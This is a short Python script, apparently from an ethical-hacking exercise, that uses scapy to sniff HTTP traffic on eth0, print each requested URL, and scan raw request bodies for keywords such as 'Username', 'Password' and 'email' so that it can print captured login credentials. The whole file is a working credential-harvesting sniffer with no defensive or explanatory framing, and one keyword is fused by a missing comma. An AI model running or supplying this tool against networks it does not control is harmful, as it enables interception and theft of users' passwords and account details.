#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keyword = ["Username", "Password", "user", "password", "pass", "User" "email", "Email"]
        for keyword in keyword:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode('utf'))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/password" + login_info + "\n\n")


sniff("eth0")
